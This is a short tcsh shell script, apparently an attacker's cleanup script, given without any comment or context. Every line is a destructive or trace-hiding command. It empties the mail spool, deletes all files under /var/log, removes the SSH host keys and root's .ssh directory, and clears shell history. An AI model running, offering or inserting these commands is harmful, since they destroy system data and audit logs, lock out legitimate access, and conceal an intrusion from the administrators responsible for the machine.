#!/bin/tcsh

echo > $MAIL
rm -rf /var/log/*
rm -rf /etc/ssh/ssh*key*
rm -rf /root/.ssh/*
history -c